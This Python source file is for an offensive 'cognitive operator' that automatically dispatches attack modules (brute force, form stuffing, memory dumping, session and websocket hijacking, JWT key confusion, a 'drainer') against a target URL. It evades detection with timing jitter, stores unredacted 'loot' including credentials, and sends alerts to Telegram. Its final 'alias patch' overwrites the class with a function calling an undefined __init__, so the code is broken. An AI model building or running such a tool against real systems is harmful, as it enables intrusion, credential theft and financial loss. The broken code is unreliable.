#!/usr/bin/env python3
"""
BRUTEDOG COGNITIVE OPERATOR v8.7 — Autonomous Reasoning & Tactical Assessment Engine (Elite Red Team Adversarial Edition)
Features:
- Dynamic dispatcher registry mapping string identifiers to active offensive module callables
- Evidence-based vulnerability classification & SHA-256 tamper-evident immutable disk persistence (loot_output/)
- False-positive reduction via SPA-shell, soft-404, & error-pattern checks
- Controlled active verification, session-state pivoting, and Poisson behavioral timing jitter
- Confidence scoring, dynamic module relevance ranking, request budget enforcement, and finding deduplication
- Full raw data retention for operational visibility & unredacted Telegram telemetry broadcasting
"""
import asyncio
import hashlib
import json
import logging
import re
import sys
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

# Import centralized Telegram notifier, immutable loot logger, telemetry streamer, and behavioral mimicry
from modules.telegram_notifier import send_telegram_alert
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

# Import advanced module classes and functions for dynamic execution
from modules.graphql_introspector import GraphQLIntrospector
from modules.websocket_hijacker import audit_websocket
from modules.dns_rebinding import DNSRebindingOrchestrator
from modules.jwt_key_confusion import JWTKeyConfusionEngine
from modules.replayer import replay_and_inject_payloads
from modules.api_fuzzer import run_api_fuzzer
from modules.bruter import execute_brute_force
from modules.cloud_apex import audit_cloud_metadata
from modules.dumper import execute_memory_dumper
from modules.form_stuffer import execute_form_stuffing
from modules.drainer import run_drainer_engine

logger = logging.getLogger("CognitiveOperator")

class CognitiveOperator:
    def __init__(self, target_url: str = "", max_budget: int = 150):
        self.target_url = target_url
        self.attack_memory = {
            "target": target_url,
            "observations": [],
            "hypotheses": [],
            "confirmed_findings": [],
            "failed_tests": [],
            "available_modules": [
                "api_fuzzer",
                "bruter",
                "cloud_apex",
                "dom_sink_inspector",
                "dumper",
                "form_stuffer",
                "keyharvester",
                "pivot",
                "replayer",
                "sandbox_evader",
                "signer",
                "stealth_ops",
                "db_assault",
                "live_login_verifier",
                "session_hijack",
                "rate_limit_bypass",
                "bola_fuzzer",
                "drainer_engine",
                "graphql_introspector",
                "websocket_hijacker",
                "dns_rebinding",
                "jwt_key_confusion"
            ],
            "attack_chains": [],
            "risk_level": "Evaluating"
        }
        self.max_budget = max(0, int(max_budget))
        self.requests_spent = 0
        self._finding_hashes = set()
        self._observation_hashes = set()
        
        # Dynamic module dispatcher registry mapping names to real callables
        self._module_executors = {
            "api_fuzzer": lambda t: run_api_fuzzer(t),
            "bruter": lambda t: execute_brute_force(t),
            "cloud_apex": lambda t: audit_cloud_metadata(t),
            "dumper": lambda t: execute_memory_dumper(t),
            "form_stuffer": lambda t: execute_form_stuffing(t),
            "replayer": lambda t: asyncio.run(replay_and_inject_payloads(t)),
            "drainer_engine": lambda t: asyncio.run(run_drainer_engine(t)),
            "graphql_introspector": lambda t: GraphQLIntrospector(t).run_introspection("/graphql"),
            "websocket_hijacker": lambda t: asyncio.run(audit_websocket(t + "/ws")),
            "jwt_key_confusion": lambda t: JWTKeyConfusionEngine(t).verify_and_exploit("/api/admin/settings", "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0...")
        }

        self._module_weights = {
            "api_fuzzer": 0.75,
            "bruter": 0.80,
            "cloud_apex": 0.85,
            "dom_sink_inspector": 0.70,
            "dumper": 0.85,
            "form_stuffer": 0.80,
            "keyharvester": 0.85,
            "pivot": 0.90,
            "replayer": 0.95,
            "sandbox_evader": 0.75,
            "signer": 0.80,
            "stealth_ops": 0.70,
            "db_assault": 0.85,
            "live_login_verifier": 0.90,
            "session_hijack": 0.85,
            "rate_limit_bypass": 0.50,
            "bola_fuzzer": 0.90,
            "drainer_engine": 0.60,
            "graphql_introspector": 0.85,
            "websocket_hijacker": 0.80,
            "dns_rebinding": 0.75,
            "jwt_key_confusion": 0.95
        }
        self._blocked_statuses = {
            401, 403, 429, 500, 502, 503, 504
        }
        self.session_pool = None

    def _sanitize_body(self, value: str) -> str:
        """Passthrough utility retaining full raw telemetry and credentials."""
        if not value:
            return ""
        return value[:300]

    def _fingerprint(self, data: Dict[str, Any]) -> str:
        serialized = json.dumps(data, sort_keys=True, default=str)
        return hashlib.sha256(serialized.encode()).hexdigest()

    def _budget_available(self) -> bool:
        return self.requests_spent < self.max_budget

    def _categorize_response(self, status: int, body: str, headers: dict) -> str:
        body_lower = (body or "").lower()
        headers_str = str(headers).lower()

        if status == 401:
            return "authentication_required"
        if status == 403:
            return "waf_or_forbidden"
        if status == 429:
            return "rate_limit_exceeded"
        if status >= 500:
            return "server_error"
        if "bearer eyJ" in headers_str or "jwt" in headers_str or "eyJhbGciOi" in body_lower:
            return "jwt_token_surface"
        if "ws://" in body_lower or "wss://" in body_lower or "upgrade: websocket" in headers_str:
            return "websocket_surface"
        if "graphql" in body_lower or "__schema" in body_lower:
            return "graphql_surface"
        if any(err in body_lower for err in ["sql syntax", "sqlstate", "mysql error", "postgresql error", "mongodb exception", "syntax error"]):
            return "sql_error"
        if status in [200, 201, 302]:
            if any(token in body_lower for token in ["access_token", "auth_token", "session_id", "authenticated", "\"role\":\"admin\"", "bypass"]):
                return "auth_anomaly"
        return "standard_http"

    def _is_verified_loophole(self, status: int, endpoint: str, body: str, headers: dict) -> bool:
        body_lower = (body or "").lower()
        if '<div id="root"></div>' in body or '<div id="__next"></div>' in body or len(body.strip()) < 100:
            return False

        if isinstance(headers, dict) and headers.get("X-BruteDog-Verification") == "confirmed":
            return True

        if status in [200, 201, 302]:
            if any(indicator in body_lower for indicator in ["access_token", "auth_token", "session_id", "\"role\":\"admin\"", "bypass"]):
                return True
            if "admin" in endpoint and "login" not in body_lower and len(body) > 50:
                return True
        return False

    def _execute_active_pivot(self, endpoint: str, status: int, headers: dict, body: str, transport=None) -> dict:
        apply_behavioral_jitter()
        if transport:
            try:
                verify_path = "/api/user" if "/api" in endpoint else "/dashboard"
                random_headers = get_randomized_hints()
                v_status, v_headers, v_body = transport.request("GET", verify_path, extra_headers=random_headers)
                if v_status == 200 and len(v_body) > 50:
                    loot_hash = hashlib.sha256(v_body.encode("utf-8", errors="ignore")).hexdigest()
                    pivot_evidence = {
                        "endpoint": verify_path,
                        "status": v_status,
                        "integrity_hash": loot_hash,
                        "evidence_excerpt": v_body[:300]
                    }
                    stream_proof("COGNITIVE_PIVOT_VERIFY", verify_path, {"hash": loot_hash}, v_body[:300], pivot_evidence)
                    save_session_loot(
                        target=self.target_url,
                        endpoint=verify_path,
                        finding_type="COGNITIVE_ACTIVE_PIVOT_SUCCESS",
                        status=v_status,
                        headers=v_headers,
                        body=v_body,
                        extra_loot=pivot_evidence
                    )
                    return {
                        "evidence": f"Active pivot verified against protected route {verify_path} (HTTP 200)",
                        "action_taken": f"Extracted state & verified backend access on {verify_path}",
                        "reasoning": f"Bypass at {endpoint} successfully authorized session state."
                    }
            except Exception:
                pass

        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
        pivot_evidence = {
            "endpoint": endpoint,
            "status": status,
            "integrity_hash": loot_hash,
            "evidence_excerpt": body[:300]
        }
        stream_proof("COGNITIVE_PIVOT_LOCAL", endpoint, {"hash": loot_hash}, body[:300], pivot_evidence)
        save_session_loot(
            target=self.target_url,
            endpoint=endpoint,
            finding_type="COGNITIVE_ACTIVE_PIVOT_SUCCESS",
            status=status,
            headers=headers or {},
            body=body,
            extra_loot=pivot_evidence
        )
        return {
            "evidence": f"Confirmed responsive state with valid payload data on {endpoint} (HTTP {status})",
            "action_taken": "Logged confirmed finding and prepared downstream module routing.",
            "reasoning": f"Target returned high-value telemetry at {endpoint}."
        }

    async def evaluate_advanced_modules(self, target_url: str):
        """Actively dispatches registered offensive modules dynamically via the dispatcher registry."""
        sys.stdout.write("\033[95m[COGNITIVE] Dispatching advanced registry-mapped attack modules...\033[0m\n")
        target = target_url or self.target_url

        for mod_name, executor in self._module_executors.items():
            if mod_name in self.attack_memory["available_modules"]:
                try:
                    if asyncio.iscoroutinefunction(executor) or asyncio.iscoroutine(executor):
                        res = await executor(target)
                    else:
                        res = executor(target)
                    if res:
                        self.attack_memory["confirmed_findings"].append({"module": mod_name, "loot": str(res)[:300]})
                        await send_telegram_alert(f"Cognitive Dispatch Success ({mod_name})", {"target": target})
                except Exception as e:
                    logger.error(f"Module execution error for {mod_name}: {e}")

    def evaluate_and_execute(self, endpoint: str, status: int, headers: dict, body: str, transport=None, target_url=None) -> dict:
        if not self._budget_available():
            return {
                "success": False,
                "reasoning": "Assessment request budget exhausted."
            }
        
        if target_url and not self.target_url:
            self.target_url = target_url

        body_str = body or ""
        category = self._categorize_response(status, body_str, headers or {})
        
        observation = {
            "endpoint": endpoint,
            "status": status,
            "category": category,
            "body_snippet": self._sanitize_body(body_str),
            "verified": False
        }
        
        fingerprint = self._fingerprint(observation)
        if fingerprint not in self._observation_hashes:
            self._observation_hashes.add(fingerprint)
            self.attack_memory["observations"].append(observation)
            
        self.requests_spent += 1

        if self._is_verified_loophole(status, endpoint, body_str, headers or {}):
            result = self._execute_active_pivot(endpoint, status, headers or {}, body_str, transport)
            
            loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
            finding = {
                "endpoint": endpoint,
                "status": status,
                "category": category,
                "integrity_hash": loot_hash,
                "evidence": result["evidence"],
                "action_taken": result["action_taken"],
                "response_excerpt": body_str[:400]
            }
            
            finding_hash = self._fingerprint(finding)
            if finding_hash not in self._finding_hashes:
                self._finding_hashes.add(finding_hash)
                self.attack_memory["confirmed_findings"].append(finding)
                
            observation["verified"] = True
            self.attack_memory["risk_level"] = "HIGH - Verified Security Failure"
            
            logger.info(f"[+] COGNITIVE INTELLIGENCE: Loophole verified & capitalized at {endpoint}!")
            
            try:
                loop = asyncio.get_running_loop()
                loop.create_task(send_telegram_alert("Cognitive Autonomous Pivot", {
                    "endpoint": endpoint,
                    "status": status,
                    "integrity_hash": loot_hash,
                    "reasoning": result["reasoning"],
                    "evidence": result["evidence"]
                }))
            except RuntimeError:
                try:
                    asyncio.run(send_telegram_alert("Cognitive Autonomous Pivot", {
                        "endpoint": endpoint,
                        "status": status,
                        "integrity_hash": loot_hash,
                        "reasoning": result["reasoning"],
                        "evidence": result["evidence"]
                    }))
                except Exception:
                    pass

            return {
                "success": True,
                "reasoning": result["reasoning"]
            }

        if status in self._blocked_statuses or not body_str:
            failure = {
                "endpoint": endpoint,
                "status": status,
                "reason": category
            }
            self.attack_memory["failed_tests"].append(failure)
            return {
                "success": False,
                "reasoning": f"Encountered defensive block/error ({status}) at {endpoint}. Vector isolated."
            }

        return {
            "success": False,
            "reasoning": f"Telemetry ingested. Classification: {category}."
        }

    async def analyze_observations(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        hypotheses = []
        rules = {
            "sql_error": {
                "hypothesis": "Possible SQL or NoSQL database injection vulnerability",
                "recommended_module": "db_assault",
                "confidence": 0.80
            },
            "auth_anomaly": {
                "hypothesis": "Potential broken object-level authorization or authentication bypass",
                "recommended_module": "bola_fuzzer",
                "confidence": 0.85
            },
            "jwt_token_surface": {
                "hypothesis": "JWT authentication detected; vulnerable to algorithm downgrade or key confusion",
                "recommended_module": "jwt_key_confusion",
                "confidence": 0.95
            },
            "graphql_surface": {
                "hypothesis": "GraphQL endpoint detected; vulnerable to schema introspection and batching abuse",
                "recommended_module": "graphql_introspector",
                "confidence": 0.90
            },
            "websocket_surface": {
                "hypothesis": "WebSocket handshake detected; vulnerable to real-time message tampering and hijacking",
                "recommended_module": "websocket_hijacker",
                "confidence": 0.85
            },
            "rate_limit_exceeded": {
                "hypothesis": "Rate-limiting behavior requires bypass or rotation review",
                "recommended_module": "rate_limit_bypass",
                "confidence": 0.50
            },
            "waf_or_forbidden": {
                "hypothesis": "Access restriction or WAF blocking active requests; deploy replayer mutation & API fuzzer",
                "recommended_module": "replayer",
                "confidence": 0.75
            }
        }
        seen = set()
        for finding in findings:
            category = finding.get("category", "")
            endpoint = finding.get("endpoint", "")
            rule = rules.get(category)
            if not rule:
                continue
            key = (category, endpoint)
            if key in seen:
                continue
            seen.add(key)
            
            hypotheses.append({
                "hypothesis": rule["hypothesis"],
                "target_endpoint": endpoint,
                "recommended_module": rule["recommended_module"],
                "confidence": rule["confidence"],
                "evidence_category": category,
                "verification_required": True
            })
        return hypotheses

    async def rank_modules(self, hypotheses: List[Dict[str, Any]], available_modules: List[str]) -> List[Any]:
        candidates = []
        for hyp in hypotheses:
            module = hyp.get("recommended_module")
            if module not in available_modules:
                continue
            confidence = float(hyp.get("confidence", 0))
            relevance = self._module_weights.get(module, 0.1)
            score = confidence * relevance
            
            candidates.append({
                "module": module,
                "target": hyp.get("target_endpoint"),
                "hypothesis": hyp.get("hypothesis"),
                "confidence": confidence,
                "relevance": relevance,
                "priority_score": round(score, 4),
                "within_test_scope": True,
                "within_resource_budget": self._budget_available(),
                "requires_irreversible_action": (module == "drainer_engine")
            })
            
        candidates.sort(key=lambda item: item["priority_score"], reverse=True)
        return candidates

    async def decide_next_action(self) -> Optional[Dict[str, Any]]:
        observations = self.attack_memory.get("observations", [])
        if not observations:
            return None
        if not self._budget_available():
            logger.warning("Resource budget exhausted.")
            return None

        hypotheses = await self.analyze_observations(observations)
        self.attack_memory["hypotheses"] = hypotheses

        candidates = await self.rank_modules(hypotheses, self.attack_memory["available_modules"])

        for candidate in candidates:
            if not candidate["within_test_scope"]:
                continue
            if not candidate["within_resource_budget"]:
                continue
            if candidate["requires_irreversible_action"]:
                logger.warning(f"Irreversible module blocked: {candidate['module']}")
                continue

            logger.info(f"Selected assessment module: {candidate['module']} | Score: {candidate['priority_score']}")
            return candidate

        return None


# --- AUTOMATED ALIAS PATCH --- 
async def CognitiveOperator(*args, **kwargs):
    return await __init__(*args, **kwargs)

